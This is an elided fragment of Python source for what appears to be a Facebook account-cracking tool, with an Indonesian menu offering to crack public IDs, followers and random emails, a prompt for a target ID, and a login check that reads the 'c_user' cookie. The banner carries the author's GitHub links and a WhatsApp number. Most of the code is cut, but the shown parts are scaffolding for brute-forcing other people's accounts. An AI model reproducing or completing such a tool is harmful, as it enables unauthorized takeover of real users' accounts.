...
class Main():
	...
	def intro(self):
		...
		my_r = my__.add(f"{c}Z O X{q}")
		my_rr= my_r.add(f"\r{k}My Github{q}")
		my_rr.add(f"{c}https://githuh.coMR-AZAN{q}")
		my_rr.add(f"{c}https://githuh.com/AZAN{q}")

		my_rrr=my_r.add(f"\r{i}My WhatsApp{q}")
		my_rrr.add(f"{b}+923165456679{q}")
...
Crack  Public ID{QQ}({KK}CRACK{QQ})
Crack Follow ID
Crack  Random ID Email
Check Jumlah Teman
Check Hasil Crack
...
{II}ONN"""
	...
	def public_mass(self):
		try:
			...
			os.sys.exit()
		god = ""
		kotak("# INPUT ID TARGET",K,Q)
		try:jmlh_ = int(input(">--id--> "))
		except:jmlh_ = 1
		kotak("# SILAHKAN INPUT IDZ/USERNAME UNTUK CRACK !!",C,Q)
...
class crack_new:
	...
	def otomatis(self):
		global anim,anim2
		anim = Progress(SpinnerColumn("earth"),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
...
def check_op(userrz,pwz,ttl,opsi):
	try:
		...
		if "c_user" in ses.cookies:
			...
			if(str(len(ngew))=="0"):
				opsi.add(f"{u}SELAMAT AKUN INI TAP YES 😎 {q}({b}Login fb Lite/Mbasic{q})")
